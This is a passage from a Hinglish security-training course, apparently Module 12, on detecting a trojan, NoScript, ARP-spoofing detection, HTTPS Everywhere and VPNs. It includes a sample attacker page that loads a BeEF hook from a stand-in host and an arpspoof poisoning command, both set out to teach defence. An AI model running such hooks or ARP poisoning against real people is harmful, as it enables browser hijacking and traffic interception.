# Or use command line:

tasklist /v /FI "IMAGENAME eq svch0st.exe"
# tasklist: List processes
# /v: Verbose (detailed information)
# /FI: Filter option
# "IMAGENAME eq svch0st.exe": Filter by process name
# IMAGENAME: Process executable name
# eq: Equals operator
# Output:
Image Name                     PID Session Name        Session#    Mem Usage Status          User Name                                              CPU Time Window Title
========================= ======== ================ =========== ============ =============== ================================================== ============ ========================================================================
svch0st.exe                   3456 Console                    1     45,678 K Running         VICTIM-PC\john                                      00:15:30 N/A

# Analysis:
# - PID: 3456
# - Memory: 45,678 K (45 MB) - Reasonable
# - Status: Running
# - User: john (not SYSTEM) - ‚ùå SUSPICIOUS!
#   Real svchost.exe runs as SYSTEM, not regular user
# - CPU Time: 00:15:30 (15 minutes 30 seconds of CPU time)

# Check process location:
wmic process where processid=3456 get ExecutablePath
# Output:
ExecutablePath
C:\Users\john\AppData\Local\Temp\svch0st.exe

# ‚ùå RED FLAG: Running from Temp folder!
# Legitimate svchost.exe location: C:\Windows\System32\svchost.exe
# Malware often runs from Temp, AppData, or Downloads
```

**Step 5: Check Network Activity**
```bash
# Resource Monitor ‚Üí Network tab
# Or command line:

netstat -ano | findstr 3456
# netstat -ano: Network connections with PIDs
# -ano: All connections, numerical, show PID
# |: Pipe operator (pass output to next command)
# findstr: Windows grep command (text search)
# 3456: Search pattern (PID we're investigating)
# findstr 3456: Filter for PID 3456
# Shows network connections of suspicious process
# Result: Only connections belonging to PID 3456

# Output:
TCP    192.168.1.20:49234     45.67.89.123:4444      ESTABLISHED     3456
TCP    192.168.1.20:49235     45.67.89.123:4444      ESTABLISHED     3456

# Analysis:
# - Local IP: 192.168.1.20 (victim machine)
# - Remote IP: 45.67.89.123 (attacker server)
# - Remote Port: 4444 (common backdoor port)
# - State: ESTABLISHED (active connection)
# - PID: 3456 (our suspicious process)

# ‚ùå RED FLAG: Outbound connection to unknown IP on suspicious port!

# Check IP reputation:
# Visit: https://www.abuseipdb.com/check/45.67.89.123
# Result: IP flagged for malicious activity (C2 server)
```

**Step 6: Check Startup/Persistence**
```bash
# Check if malware has persistence:

# Method 1: Registry Run keys
reg query HKCU\Software\Microsoft\Windows\CurrentVersion\Run
# reg: Registry command-line tool
# query: Read registry values
# HKCU: HKEY_CURRENT_USER (current user's registry)
# \Software\Microsoft\Windows\CurrentVersion\Run: Startup programs key
# Shows programs that run at user login
# Common persistence location for malware

# Output:
HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run
    SystemUpdate    REG_SZ    C:\Users\john\AppData\Local\Temp\svch0st.exe

# ‚ùå RED FLAG: Malware added itself to startup!
# Key name: "SystemUpdate" (fake name to look legitimate)
# Value: Path to malware executable

# Method 2: Scheduled Tasks
schtasks /query /fo LIST /v | findstr svch0st
# schtasks: Scheduled tasks command
# /query: List all scheduled tasks
# /fo LIST: Format output as list (readable format)
# /v: Verbose (detailed info - shows all task properties)
# |: Pipe to filter
# findstr svch0st: Filter for our malware name
# Shows if malware created scheduled task for persistence

# Output:
TaskName: SystemUpdateTask
Task To Run: C:\Users\john\AppData\Local\Temp\svch0st.exe
Run As User: john
Schedule: At system startup

# ‚ùå RED FLAG: Scheduled task for persistence!
```

**Step 7: Sandbox Analysis (Safe Investigation)**
```bash
# Don't execute suspicious file on real system!
# Use online sandbox:

# 1. Upload to VirusTotal
#    https://www.virustotal.com
#    - Upload svch0st.exe
#    - Wait for analysis
#    - Result: 45/70 antivirus engines detect as malware
#    - Detection names: Trojan.Generic, Backdoor.Agent, etc.

# 2. Upload to Any.run
#    https://app.any.run
#    - Interactive sandbox
#    - Shows real-time behavior
#    - Network connections visible
#    - Process tree shown
#    - Screenshots captured

# 3. Upload to Hybrid Analysis
#    https://www.hybrid-analysis.com
#    - Detailed behavioral analysis
#    - Shows: Registry changes, File operations, Network activity
#    - Threat score: 100/100 (Malicious)

# Sandbox Results:
# - Connects to 45.67.89.123:4444 (C2 server)
# - Creates registry key for persistence
# - Injects code into explorer.exe
# - Captures keystrokes
# - Exfiltrates data
# - Verdict: TROJAN/BACKDOOR
```

**Step 8: Remediation**
```bash
# Remove malware:

# 1. Kill process
taskkill /F /PID 3456
# taskkill: Terminate process command
# /F: Force kill (terminate immediately, no graceful shutdown)
# /PID 3456: Process ID to kill
# Output: SUCCESS: The process with PID 3456 has been terminated.

# 2. Delete file
del "C:\Users\john\AppData\Local\Temp\svch0st.exe"
# del: Delete file command
# "path": File path in quotes (handles spaces)
# Deletes malware executable
# Removes malware from disk

# 3. Remove persistence
reg delete HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v SystemUpdate /f
# reg delete: Delete registry value
# HKCU\...\Run: Startup registry key
# /v SystemUpdate: Value name to delete
# /f: Force (no confirmation prompt)
# Removes registry startup entry
# /v SystemUpdate: Value name
# /f: Force (no confirmation)

schtasks /delete /tn "SystemUpdateTask" /f
# schtasks /delete: Delete scheduled task
# /tn: Task name parameter
# "SystemUpdateTask": Name of task to delete
# /f: Force (no confirmation)
# Deletes scheduled task
# /tn: Task name
# /f: Force

# 4. Scan with antivirus
# Run full system scan

# 5. Change passwords
# All passwords may be compromised (keylogger)

# 6. Monitor for reinfection
# Check processes regularly for next few days
```

### üí° Pro Tip / Galti:

**Pro Tip**: Look for process parent-child relationships:

```bash
# Check process tree:
wmic process get processid,parentprocessid,executablepath
# wmic process: Query all processes
# get: Retrieve specific properties
# processid: Current process ID
# parentprocessid: Parent process ID (who started this process)
# executablepath: Full path to executable
# Shows which process started which
# Helps identify injection/spawning
# Parent-child relationships reveal attack patterns

# Example suspicious relationship:
# winword.exe (PID 1234) ‚Üí powershell.exe (PID 5678)
# ‚ùå RED FLAG: Word spawned PowerShell (likely macro attack)

# Normal relationship:
# explorer.exe (PID 1234) ‚Üí chrome.exe (PID 5678)
# ‚úì NORMAL: User opened Chrome from Explorer

# Use Process Explorer (Sysinternals):
# Download: https://docs.microsoft.com/sysinternals
# Shows visual process tree
# Highlights suspicious processes
# Shows DLLs loaded
# Network connections per process
```

**Common Mistake**: Killing process without removing persistence:

```
‚ùå Bad: Only killing malware process
taskkill /F /PID 3456
# Malware killed
# But persistence remains!
# After reboot: Malware runs again

‚úì Good: Complete removal
1. Kill process
2. Delete file
3. Remove registry keys
4. Delete scheduled tasks
5. Check startup folders
6. Scan with antivirus
7. Monitor for reinfection

# Checklist:
‚ñ° Process killed
‚ñ° File deleted
‚ñ° Registry cleaned
‚ñ° Scheduled tasks removed
‚ñ° Startup folders checked
‚ñ° Full AV scan done
‚ñ° Passwords changed
‚ñ° System monitored
```

---

## üìö Topic 12.3: Browser Defense (NoScript Plugin)

### üéØ Topic/Technique:
**Browser Hardening** - NoScript extension use karke JavaScript-based attacks se protection.

### ü§î Yeh Kya Hai?
NoScript ek browser extension hai (Firefox, Chrome) jo by default sabhi scripts (JavaScript, Flash, Java, etc.) ko block kar deta hai. Sirf trusted websites par scripts allow hote hain. Yeh XSS attacks, BeEF hooking, drive-by downloads, aur malicious JavaScript se protect karta hai. User ko control milta hai ki kis website par scripts run ho sakte hain.

### üõ°Ô∏è Pentester ke liye Kyun Zaroori Hai?
- Samajhna ki defenders kaise JavaScript attacks block karte hain
- BeEF aur XSS attacks ki limitations understand karna
- Browser security mechanisms test karna
- Client ko browser hardening sikhana
- Realistic attack scenarios simulate karna

### üéØ Practical Use (Asli Pentesting Mein):
- Testing JavaScript-based attacks
- Browser security assessment
- User awareness training
- Demonstrating defense effectiveness
- Bypass techniques develop karna

### ‚öôÔ∏è Yeh Kaise Kaam Karta Hai?

**NoScript Working:**
```
1. User installs NoScript extension
2. By default, all scripts blocked on all websites
3. User visits website
4. NoScript blocks JavaScript, Flash, etc.
5. Website may not work properly (broken functionality)
6. User manually whitelists trusted sites
7. Scripts allowed only on whitelisted sites
8. Malicious sites remain blocked
```

**What NoScript Blocks:**
```
‚úì JavaScript (most common attack vector)
‚úì Flash (vulnerable plugin)
‚úì Java applets (security risks)
‚úì Silverlight (Microsoft plugin)
‚úì WebGL (3D graphics, can be exploited)
‚úì Other active content
```

### üëç Pros (Fayde):
- Blocks XSS attacks
- Prevents BeEF hooking
- Stops drive-by downloads
- Blocks malicious redirects
- Improves privacy (blocks trackers)
- Faster page loading (no scripts)
- User control (whitelist trusted sites)

### üëé Cons (Nuksaan):
- Breaks website functionality
- Requires manual whitelisting
- Inconvenient for users
- Some legitimate sites need JavaScript
- Learning curve
- May miss non-JavaScript attacks

### ‚å®Ô∏è Zaroori Commands & Steps:

**Installation:**
```bash
# Firefox:
# 1. Open Firefox
# 2. Go to: https://addons.mozilla.org/firefox/addon/noscript/
# 3. Click "Add to Firefox"
# 4. Click "Add" to confirm
# 5. NoScript icon appears in toolbar

# Chrome:
# 1. Open Chrome
# 2. Go to: https://chrome.google.com/webstore
# 3. Search "NoScript"
# 4. Click "Add to Chrome"
# 5. Click "Add extension"
```

**Configuration:**
```bash
# Click NoScript icon in toolbar
# Options:

# 1. Default mode:
#    - Block all scripts by default
#    - Safest option

# 2. Whitelist trusted sites:
#    - Click NoScript icon
#    - Click "Temp. TRUSTED" (temporary trust)
#    - Or "TRUSTED" (permanent trust)

# 3. Advanced settings:
#    - Right-click NoScript icon
#    - Options ‚Üí Advanced
#    - Configure: XSS protection, ABE (Application Boundaries Enforcer)
```

### üíª Step-by-Step Example:

**Scenario: Blocking BeEF Hook with NoScript**

**Step 1: Install NoScript**
```bash
# Firefox browser
# Install NoScript extension
# NoScript icon (S) appears in toolbar
```

**Step 2: Visit Malicious Website (BeEF Hooked)**
```html
<!-- Attacker's website with BeEF hook -->
<!DOCTYPE html>
<html>
<head>
    <title>Free iPhone Giveaway!</title>
</head>
<body>
    <h1>Congratulations! You Won!</h1>
    <p>Click below to claim your prize!</p>
    <button>Claim Now</button>
    
    <!-- BeEF Hook (malicious JavaScript) -->
    <script src="http://attacker.com:3000/hook.js"></script>
    <!-- Yeh script victim ke browser ko hook karta hai -->
    <!-- Attacker ko browser control mil jata hai -->
</body>
</html>
```

**Step 3: NoScript Blocks JavaScript**
```
# User visits: http://malicious-site.com

# Without NoScript:
# - Page loads completely
# - BeEF hook.js executes
# - Browser gets hooked
# - Attacker gains control
# - Victim doesn't notice anything

# With NoScript:
# - Page loads (HTML/CSS only)
# - JavaScript blocked!
# - BeEF hook.js NOT executed
# - Browser NOT hooked
# - Attacker gets nothing
# - NoScript shows: "Scripts blocked on this page"
```

**Step 4: User Sees Blocked Content**
```
# NoScript notification:
"NoScript blocked 1 script on this page"

# Click NoScript icon:
Blocked scripts:
‚ñ° attacker.com (1 script)
  ‚îî‚îÄ http://attacker.com:3000/hook.js

# User options:
1. [Temp. TRUSTED] - Allow temporarily (this session)
2. [TRUSTED] - Allow permanently
3. [Leave blocked] - Keep blocked (safest)

# Smart user chooses: Leave blocked
# Malicious script never executes
# Attack failed!
```

**Step 5: Compare with Legitimate Website**
```
# User visits: https://www.google.com

# NoScript blocks Google's JavaScript too
# Google search doesn't work properly (needs JS)

# User clicks NoScript icon:
Blocked scripts:
‚ñ° google.com (5 scripts)
  ‚îî‚îÄ Various Google scripts

# User trusts Google:
# Clicks [TRUSTED]
# Google scripts now allowed
# Search works normally

# Lesson:
# - Block by default
# - Whitelist only trusted sites
# - Unknown sites remain blocked
```

### üí° Pro Tip / Galti:

**Pro Tip**: Use NoScript with uBlock Origin for maximum protection:

```bash
# Defense in depth strategy:

# Layer 1: NoScript (blocks scripts)
# - Blocks JavaScript, Flash, etc.
# - Prevents XSS, BeEF, drive-by downloads

# Layer 2: uBlock Origin (blocks ads/trackers)
# - Blocks malicious ads
# - Blocks tracking scripts
# - Blocks malware domains

# Layer 3: HTTPS Everywhere (forces HTTPS)
# - Encrypts connections
# - Prevents MITM attacks

# Combined protection:
# NoScript + uBlock Origin + HTTPS Everywhere = Maximum security
# Blocks: Scripts, Ads, Trackers, Malware, MITM

# Installation:
# 1. Install NoScript
# 2. Install uBlock Origin
# 3. Install HTTPS Everywhere
# 4. Configure all three
# 5. Whitelist trusted sites only
```

**Common Mistake**: Whitelisting too many sites:

```
‚ùå Bad: Trusting every site
# User visits unknown site
# Site doesn't work (scripts blocked)
# User immediately whitelists
# Malicious scripts execute
# Attack succeeds

‚úì Good: Selective whitelisting
# User visits unknown site
# Site doesn't work
# User checks site reputation first
# If trusted: Whitelist
# If unknown: Leave blocked
# Try to use site without scripts

‚úì Better: Temporary trust first
# Use "Temp. TRUSTED" instead of "TRUSTED"
# Scripts allowed for current session only
# After closing browser, blocked again
# Safer for one-time visits
```

---

## üìö Topic 12.4: Network Defense (XARP, Wireshark Detection)

### üéØ Topic/Technique:
**ARP Spoofing Detection** - MITM attacks ko detect karna using XARP aur Wireshark.

### ü§î Yeh Kya Hai?
ARP spoofing detection tools monitor karte hain network par ARP traffic ko aur suspicious changes detect karte hain. XARP (Windows) aur arpwatch (Linux) ARP table ko continuously monitor karte hain. Jab koi attacker ARP spoofing attack karta hai, yeh tools alert generate karte hain. Wireshark se aap manually ARP traffic analyze kar sakte hain aur duplicate IP/MAC addresses detect kar sakte hain.

### üõ°Ô∏è Pentester ke liye Kyun Zaroori Hai?
- Samajhna ki defenders MITM attacks kaise detect karte hain
- ARP spoofing attacks ki limitations understand karna
- Network security tools test karna
- Stealthy attack techniques develop karna
- Client ko network defense sikhana

### üéØ Practical Use (Asli Pentesting Mein):
- Testing ARP spoofing detectability
- Network security assessment
- Incident response
- Forensic analysis
- Defense mechanism evaluation

### ‚öôÔ∏è Yeh Kaise Kaam Karta Hai?

**Detection Methods:**
```
1. ARP Table Monitoring:
   - Track IP-to-MAC mappings
   - Alert on changes
   - Detect duplicate MACs

2. Gratuitous ARP Detection:
   - Unsolicited ARP replies
   - Indicator of spoofing

3. Traffic Analysis:
   - Unusual ARP traffic volume
   - Rapid ARP changes
   - Conflicting ARP responses
```

### ‚å®Ô∏è Zaroori Commands & Steps:

**XARP (Windows):**
```bash
# Download XARP:
# https://www.chrismc.de/xarp.html

# Install and run XARP
# XARP monitors ARP table automatically

# Features:
# - Real-time ARP monitoring
# - Alert on MAC changes
# - Block suspicious ARP packets
# - Log ARP activity

# Configuration:
# 1. Open XARP
# 2. Settings ‚Üí Enable "Active Protection"
# 3. Settings ‚Üí Enable "Alert on MAC change"
# 4. XARP now monitors network
```

**arpwatch (Linux):**
```bash
# Install arpwatch
sudo apt-get install arpwatch
# sudo: Run with root privileges
# apt-get install: Package installation command
# arpwatch: ARP monitoring daemon
# Tracks IP-MAC pairings
# Sends email alerts on changes

# Start arpwatch
sudo systemctl start arpwatch
# systemctl: System service control command
# start: Start service
# arpwatch: Service name
# Starts monitoring service
# Logs to /var/log/syslog

# Check arpwatch database
cat /var/lib/arpwatch/arp.dat
# cat: Display file contents
# /var/lib/arpwatch/arp.dat: arpwatch database file
# Shows known IP-MAC mappings
# Format: IP_address MAC_address timestamp hostname

# View alerts
sudo tail -f /var/log/syslog | grep arpwatch
# tail -f: Follow file (real-time updates)
# /var/log/syslog: System log file
# |: Pipe to filter
# grep arpwatch: Filter for arpwatch messages
# Real-time monitoring
# Shows: New station, Changed ethernet address, Flip flop
```

**Wireshark Detection:**
```bash
# Start Wireshark
sudo wireshark
# sudo: Root privileges (needed for packet capture)
# wireshark: Network protocol analyzer

# Select network interface (eth0, wlan0)
# Choose interface to monitor
# Start capture
# Begin capturing packets

# Filter for ARP traffic:
arp
# Display filter: Shows only ARP packets
# Filters out all other traffic
# Shows only ARP packets
# Look for: ARP requests, ARP replies

# Detect ARP spoofing:
arp.duplicate-address-detected
# Wireshark display filter
# Automatically detects duplicate IPs
# Wireshark automatically detects duplicate IPs
# Red/black coloring indicates conflict
# Shows packets with IP conflicts

# Manual analysis:
# Look for:
# - Same MAC for different IPs (attacker's MAC)
# - Different MACs for same IP (IP conflict)
# - High volume of gratuitous ARP
# - ARP replies without requests
```

### üíª Step-by-Step Example:

**Scenario: Detecting ARP Spoofing Attack**

**Step 1: Normal Network State**
```bash
# Check ARP table (before attack)
arp -a
# arp: ARP table management command
# -a: Display all entries (all IP-MAC mappings)

# Output:
Interface: 192.168.1.20 --- 0x2
  Internet Address      Physical Address      Type
  192.168.1.1           00-11-22-33-44-55     dynamic  # Gateway (router)
  192.168.1.10          aa-bb-cc-dd-ee-ff     dynamic  # Another computer
  192.168.1.100         ff-ee-dd-cc-bb-aa     dynamic  # Attacker (not attacking yet)

# Explanation:
# - 192.168.1.1 (gateway) ‚Üí MAC: 00-11-22-33-44-55
# - 192.168.1.10 (computer) ‚Üí MAC: aa-bb-cc-dd-ee-ff
# - 192.168.1.100 (attacker) ‚Üí MAC: ff-ee-dd-cc-bb-aa
# All mappings are correct
```

**Step 2: Attacker Starts ARP Spoofing**
```bash
# Attacker machine:
sudo arpspoof -i eth0 -t 192.168.1.20 192.168.1.1
# sudo: Root privileges required
# arpspoof: ARP spoofing tool
# -i eth0: Network interface to use
# -t 192.168.1.20: Target (victim) IP address
# 192.168.1.1: Gateway IP to impersonate
# Sends fake ARP: "192.168.1.1 is at ff-ee-dd-cc-bb-aa" (attacker's MAC)
# Continuously sends fake ARP replies

# Victim's ARP table gets poisoned:
arp -a

# Output (after attack):
Interface: 192.168.1.20 --- 0x2
  Internet Address      Physical Address      Type
  192.168.1.1           ff-ee-dd-cc-bb-aa     dynamic  # ‚ùå CHANGED! (attacker's MAC)
  192.168.1.10          aa-bb-cc-dd-ee-ff     dynamic
  192.168.1.100         ff-ee-dd-cc-bb-aa     dynamic

# ‚ùå RED FLAG: Gateway MAC changed!
# - Was: 00-11-22-33-44-55
# - Now: ff-ee-dd-cc-bb-aa (attacker's MAC)
# - Same MAC for 192.168.1.1 and 192.168.1.100 (duplicate!)
```

**Step 3: XARP Detects Attack**
```
# XARP running on victim machine

# XARP Alert:
‚îå‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îê
‚îÇ  ‚ö†Ô∏è  ARP SPOOFING DETECTED!            ‚îÇ
‚îú‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î§
‚îÇ  IP: 192.168.1.1                        ‚îÇ
‚îÇ  Old MAC: 00-11-22-33-44-55             ‚îÇ
‚îÇ  New MAC: ff-ee-dd-cc-bb-aa             ‚îÇ
‚îÇ  Time: 2024-01-15 14:30:00              ‚îÇ
‚îÇ                                         ‚îÇ
‚îÇ  [Block] [Allow] [Details]              ‚îÇ
‚îî‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îò

# Explanation:
# - XARP detected MAC address change for gateway
# - Old MAC: 00-11-22-33-44-55 (real gateway)
# - New MAC: ff-ee-dd-cc-bb-aa (attacker)
# - User can block the attack

# User clicks [Block]:
# XARP blocks ARP packets from attacker
# Restores correct ARP entry
# Attack stopped!
```

**Step 4: Wireshark Analysis**
```bash
# Open Wireshark
# Filter: arp

# Captured packets:
1. ARP Reply: 192.168.1.1 is at 00-11-22-33-44-55 (legitimate)
2. ARP Reply: 192.168.1.1 is at ff-ee-dd-cc-bb-aa (spoofed!) ‚ùå
3. ARP Reply: 192.168.1.1 is at ff-ee-dd-cc-bb-aa (spoofed!) ‚ùå
4. ARP Reply: 192.168.1.1 is at ff-ee-dd-cc-bb-aa (spoofed!) ‚ùå
# Attacker sending repeated fake ARP replies

# Wireshark highlights in red:
"Duplicate IP address detected for 192.168.1.1"

# Analysis:
# - Multiple ARP replies for same IP
# - Different MAC addresses
# - High frequency (every 2 seconds)
# - Gratuitous ARP (unsolicited)
# - Clear indication of ARP spoofing!
```

**Step 5: Manual Verification**
```bash
# Check if gateway MAC is correct
# Method 1: Check router's actual MAC
# Login to router web interface
# Look for MAC address
# Compare with ARP table

# Method 2: Ping gateway and check ARP
ping 192.168.1.1
# ping: Send ICMP echo request
# 192.168.1.1: Gateway IP
# Forces ARP resolution
arp -a | findstr "192.168.1.1"
# arp -a: Display ARP table
# |: Pipe to filter
# findstr: Windows grep
# "192.168.1.1": Search for gateway entry
# If MAC doesn't match router's actual MAC ‚Üí Spoofed!

# Method 3: Static ARP entry (prevention)
arp -s 192.168.1.1 00-11-22-33-44-55
# arp -s: Add static ARP entry
# -s: Static (permanent, cannot be changed)
# 192.168.1.1: IP address
# 00-11-22-33-44-55: Correct MAC address
# -s: Static entry (permanent)
# Sets correct MAC for gateway
# Cannot be changed by ARP spoofing
# Prevents attack!

# Verify static entry:
arp -a
# Display ARP table to verify
# Output:
  192.168.1.1           00-11-22-33-44-55     static  # ‚úì Protected!
# Type: static (not dynamic)
# Static entries immune to ARP spoofing
# Cannot be poisoned
```

### üí° Pro Tip / Galti:

**Pro Tip**: Use static ARP entries for critical hosts:

```bash
# Protect gateway and critical servers with static ARP

# Windows:
arp -s 192.168.1.1 00-11-22-33-44-55      # Gateway
# arp -s: Static entry command
# IP MAC format (Windows uses dashes)
arp -s 192.168.1.10 aa-bb-cc-dd-ee-ff     # File server
arp -s 192.168.1.20 11-22-33-44-55-66     # Domain controller

# Linux:
sudo arp -s 192.168.1.1 00:11:22:33:44:55
# sudo: Root privileges
# Linux uses colons in MAC addresses
sudo arp -s 192.168.1.10 aa:bb:cc:dd:ee:ff

# Make permanent (Linux):
sudo nano /etc/network/interfaces
# nano: Text editor
# /etc/network/interfaces: Network configuration file
# Add:
post-up arp -s 192.168.1.1 00:11:22:33:44:55
# post-up: Execute after interface comes up
# Runs command when network starts
post-up arp -s 192.168.1.10 aa:bb:cc:dd:ee:ff
# Static ARP entries applied at boot

# Benefits:
# - ARP spoofing impossible for these hosts
# - MITM attacks blocked
# - Network security improved
# - No additional software needed
```

**Common Mistake**: Ignoring ARP alerts:

```
‚ùå Bad: Dismissing alerts
# XARP shows alert
# User thinks: "Probably nothing"
# Clicks "Allow"
# Attack continues
# Credentials stolen

‚úì Good: Investigating alerts
# XARP shows alert
# User checks:
#   1. Is MAC change expected? (router reboot?)
#   2. Verify with IT department
#   3. Check other devices (same alert?)
#   4. Disconnect if suspicious
# Take action based on investigation
```

---

## üìö Topic 12.5: Defense - HTTPS Everywhere & VPNs

### üéØ Topic/Technique:
**Encryption & Tunneling** - HTTPS Everywhere aur VPN use karke network attacks se protection.

### ü§î Yeh Kya Hai?
HTTPS Everywhere ek browser extension hai jo automatically websites ko HTTP se HTTPS par redirect kar deta hai (jahan available ho). VPN (Virtual Private Network) aapki saari internet traffic ko encrypt karke ek secure tunnel ke through route karta hai. Dono combined use karne se MITM attacks, SSL stripping, aur network sniffing se protection milti hai.

### üõ°Ô∏è Pentester ke liye Kyun Zaroori Hai?
- Samajhna ki encryption kaise attacks block karta hai
- SSL stripping ki limitations understand karna
- VPN bypass techniques develop karna
- Client ko secure browsing sikhana
- Realistic defense scenarios test karna

### üéØ Practical Use (Asli Pentesting Mein):
- Testing encryption effectiveness
- VPN security assessment
- SSL/TLS testing
- Network security evaluation
- User awareness training

### ‚öôÔ∏è Yeh Kaise Kaam Karta Hai?

**HTTPS Everywhere:**
```
1. User visits: http://example.com
2. HTTPS Everywhere intercepts
3. Checks if HTTPS available
4. Redirects to: https://example.com
5. Encrypted connection established
6. SSL stripping fails (already HTTPS)
```

**VPN:**
```
1. User connects to VPN server
2. Encrypted tunnel established
3. All traffic routed through tunnel
4. Traffic encrypted end-to-end
5. ISP/attacker sees only encrypted data
6. Real IP hidden (VPN server's IP shown)
```

### üëç Pros (Fayde):

**HTTPS Everywhere:**
- Forces encryption
- Prevents SSL stripping
- Automatic (no user action)
- Free and open-source
- Works on all browsers

**VPN:**
- Encrypts all traffic
- Hides IP address
- Bypasses geo-restrictions
- Protects on public WiFi
- Prevents ISP tracking

### üëé Cons (Nuksaan):

**HTTPS Everywhere:**
- Only works if HTTPS available
- Some sites break with HTTPS
- Doesn't protect non-browser traffic
- Can't prevent all MITM attacks

**VPN:**
- Costs money (good VPNs)
- Slower internet speed
- VPN provider can see traffic
- May be blocked by some sites
- Requires trust in VPN provider

### ‚å®Ô∏è Zaroori Commands & Steps:

**HTTPS Everywhere Setup:**
```bash
# Install:
# Firefox: https://addons.mozilla.org/firefox/addon/https-everywhere/
# Chrome: https://chrome.google.com/webstore (search "HTTPS Everywhere")

# Configuration:
# 1. Click HTTPS Everywhere icon
# 2. Settings:
#    ‚òë Encrypt All Sites Eligible
#    ‚òë Block all unencrypted requests (advanced)
# 3. Save

# Usage:
# Automatic! No manual action needed
# Extension works in background
```

**VPN Setup (OpenVPN):**
```bash
# Linux:
sudo apt-get install openvpn
# Installs OpenVPN client

# Connect to VPN:
sudo openvpn --config /path/to/config.ovpn
# sudo: Root privileges (VPN needs network access)
# openvpn: OpenVPN client command
# --config: Specify configuration file
# /path/to/config.ovpn: VPN config file path
# --config: VPN configuration file
# Contains: Server address, encryption settings, credentials

# Verify VPN connection:
curl ifconfig.me
# curl: HTTP client (fetch URL)
# ifconfig.me: Service that returns your public IP
# Shows your public IP
# Should show VPN server's IP, not your real IP

# Check for DNS leaks:
# Visit: https://dnsleaktest.com
# DNS leak = DNS queries bypass VPN
# Should show VPN provider's DNS, not ISP's DNS
# If ISP's DNS visible = DNS leak (privacy issue)
```

### üíª Step-by-Step Example:

**Scenario: Protecting Against MITM on Public WiFi**

**Step 1: Without Protection (Vulnerable)**
```bash
# User connects to "Free_WiFi" at coffee shop
# Attacker running ARP spoofing + SSL stripping

# User visits: http://facebook.com
# Attacker intercepts
# SSL stripping downgrades to HTTP
# User enters credentials over HTTP
# Attacker captures: email + password
# Attack successful!
```

**Step 2: With HTTPS Everywhere (Partial Protection)**
```bash
# User installs HTTPS Everywhere
# Connects to "Free_WiFi"

# User visits: http://facebook.com
# HTTPS Everywhere redirects to: https://facebook.com
# Encrypted connection established
# Attacker sees encrypted traffic only
# Cannot read credentials
# Attack failed!

# But limitations:
# - Only protects browser traffic
# - Other apps still vulnerable
# - DNS queries still visible
# - IP address still visible
```

**Step 3: With VPN (Full Protection)**
```bash
# User installs VPN (NordVPN, ExpressVPN, etc.)
# Connects to VPN before connecting to WiFi

# VPN connection:
sudo openvpn --config nordvpn.ovpn
# Encrypted tunnel established
# All traffic routed through VPN

# User connects to "Free_WiFi"
# User visits: http://facebook.com

# Attacker's perspective:
# - Sees encrypted VPN traffic only
# - Cannot see destination (facebook.com)
# - Cannot see credentials
# - Cannot perform MITM (traffic encrypted)
# - Attack completely failed!

# User's traffic flow:
User ‚Üí VPN tunnel (encrypted) ‚Üí VPN server ‚Üí Facebook
# Attacker can only see: User ‚Üí VPN server (encrypted)
# Cannot see: VPN server ‚Üí Facebook
```

**Step 4: Combined Protection (Maximum Security)**
```bash
# Best practice: HTTPS Everywhere + VPN

# Layer 1: VPN
# - Encrypts all traffic
# - Hides destination
# - Protects all apps

# Layer 2: HTTPS Everywhere
# - Forces HTTPS on websites
# - Additional encryption layer
# - Protects against VPN failures

# Result:
# - Double encryption (VPN + HTTPS)
# - Maximum protection
# - Even if VPN fails, HTTPS protects
# - Even if HTTPS fails, VPN protects
```

### üí° Pro Tip / Galti:

**Pro Tip**: Always use VPN on public WiFi:

```bash
# Public WiFi = Dangerous!
# - Coffee shops
# - Airports
# - Hotels
# - Libraries
# - Any open WiFi

# Threats:
# - ARP spoofing
# - SSL stripping
# - Packet sniffing
# - Fake access points
# - Session hijacking

# Protection:
# 1. Connect to VPN BEFORE connecting to WiFi
# 2. Enable HTTPS Everywhere
# 3. Disable auto-connect to WiFi
# 4. Verify WiFi name with staff
# 5. Use cellular data if possible

# VPN recommendations:
# ‚úì NordVPN (fast, secure)
# ‚úì ExpressVPN (reliable)
# ‚úì ProtonVPN (privacy-focused)
# ‚ùå Free VPNs (sell your data, slow, insecure)
```

**Common Mistake**: Trusting HTTPS alone:

```
‚ùå Bad: "I see HTTPS, I'm safe"
# HTTPS protects data in transit
# But doesn't protect against:
# - Phishing (fake HTTPS sites)
# - Malware downloads
# - Compromised endpoints
# - DNS hijacking
# - VPN-level attacks

‚úì Good: Defense in depth
# 1. HTTPS Everywhere (force encryption)
# 2. VPN (encrypt all traffic)
# 3. NoScript (block malicious scripts)
# 4. uBlock Origin (block ads/trackers)
# 5. Antivirus (detect malware)
# 6. Common sense (verify URLs, don't click suspicious links)

# All layers combined = Maximum security
```

---

**üéâ Module 12 Complete! üéâ**

**Topics Covered:**
‚úÖ 12.1: Detecting Fake Emails (Email Headers)
‚úÖ 12.2: Detecting Trojans (Resource Monitor, Sandbox)
‚úÖ 12.3: Browser Defense (NoScript Plugin)
‚úÖ 12.4: Network Defense (XARP, Wireshark Detection)
